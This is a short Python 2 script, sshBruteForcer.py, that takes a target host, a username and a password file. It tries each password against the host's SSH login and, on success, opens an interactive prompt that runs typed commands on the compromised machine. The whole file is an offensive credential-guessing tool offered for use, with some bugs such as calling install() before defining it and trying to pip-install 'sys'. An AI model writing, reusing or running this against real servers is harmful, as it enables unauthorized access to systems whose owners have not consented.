#!/usr/bin/python
print "[+]checking module dependencies"
try:
	import pip
	import sys
	from optparse import OptionParser
	from pexpect import pxssh
	print "[+]modules imported successfully"

except Exception,e:
	print "[-] Exception: " + str(e)
	print "[+] Installing dependencies"
	try:
		print "[+] retrying..."
		install()
		import pip
		from pexpect import pxssh
	except Exception,e:
		print "[-]Failed due to " + str(e)
		sys.exit(1)

def install():
	pip.main(['install','pexpect'])
	pip.main(['install','sys'])

def bruteforcer(hname,uname,passwds):
	print "[+]initiating bruteforce..."
	f = open(passwds,"r")
	for line in f.readlines():
		password = line.strip("\n")
		print "[+]trying password: " + password
		while(1):
			try:
				s = pxssh.pxssh()
				login = s.login(hname,uname,password)
			except Exception, e:
				print "[-]login was not successful"
				break
			if (login):
				try:
		#			print "[+]login successful"
					cmd = raw_input("#")
					s.sendline(cmd)
					s.prompt()
					print s.before
					s.close()
				except KeyboardInterrupt:
					print "[-]exiting..."
					sys.exit(2)

def main():
	parser = OptionParser(usage = "usage: sshBruteForcer.py -t <target> -u <username> -p <password>")
	parser.add_option("-u", dest = "usernames", type="string", help="provide list of usernames")
	parser.add_option("-p", dest = "passwords", type="string", help="provide passwords file")
	parser.add_option("-t", dest= "hostname", type="string", help="enter target")
	(options, args) = parser.parse_args()
	if(options.usernames ==None ) | (options.passwords == None) | (options.hostname == None):
		print parser.usage
		sys.exit(3)
	hostname = options.hostname
	passwords = options.passwords
	usernames = options.usernames

	bruteforcer(hostname,usernames,passwords)

if __name__ == "__main__":
	main()
